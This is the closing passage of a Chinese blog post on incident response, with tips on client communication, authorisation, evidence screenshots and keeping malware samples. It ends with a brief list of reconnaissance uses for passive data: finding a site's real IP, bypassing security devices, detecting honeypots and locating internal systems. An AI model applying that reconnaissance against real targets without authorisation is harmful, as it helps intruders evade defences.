<p><strong>高效的“检测”与“响应”能力</strong></p>
<p>开发阶段预防</p>
<h2 id="坑">坑<a hidden class="anchor" aria-hidden="true" href="#坑">#</a></h2>
<p>应急人员需要保持清醒的头脑，冷静处理问题。整个应急流程中要注意：</p>
<p>一、多和客户进行交流，询问运维人员及其他人员在事件发生后所做的操作是什么；</p>
<p>二、询问客户部署有哪些安全设备有哪些，安全设备能够帮助应急人员少走很多弯路；</p>
<p>三、遇到特殊操作，需获得客户授权，经用户授权后再进行处置；</p>
<p>四、整个处置过程中，发现的异常问题及时上报并截图留存处置细节(最好带有时间戳)；</p>
<p>五、整个处置过程中遇到的恶意病毒样本需要在桌面等位置建立相关文件夹，把恶意文件存放在桌面上，以便后续取出分析；</p>
<h2 id="数据储备">数据储备<a hidden class="anchor" aria-hidden="true" href="#数据储备">#</a></h2>
<p>此时，全网数据和被动信息搜集就会变得非常有价值，比如DNS历史解析记录、Whois历史信息、历史端口开放情况、网络流量信息等等，这些数据可以帮助你：</p>
<ul>
<li>找出网站真实IP，挖掘相邻网段、绕过安全设备</li>
<li>判断目标是否为蜜罐</li>
<li>定位内网IP和系统</li>
<li>定位关键的应用系统</li>
</ul>

</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://inten.kro1lsec.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></li>
    </ul>
<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share 应急响应 on twitter"
        href="https://twitter.com/intent/tweet/?text=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94&amp;url=https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f&amp;hashtags=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 应急响应 on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f&amp;title=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94&amp;summary=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94&amp;source=https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 应急响应 on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f&title=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 应急响应 on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 应急响应 on whatsapp"
        href="https://api.whatsapp.com/send?text=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%20-%20https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 应急响应 on telegram"
        href="https://telegram.me/share/url?text=%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94&amp;url=https%3a%2f%2finten.kro1lsec.com%2fpost%2f%25E5%25BA%2594%25E6%2580%25A5%25E5%2593%258D%25E5%25BA%2594%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    <footer class="footer">
    <span>&copy; 2021 <a href="https://inten.kro1lsec.com/">intenのblog🍦</a></span>
    <span>&middot;</span>
    
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        container.appendChild(copybutton);
    });
</script>
</body>

</html>
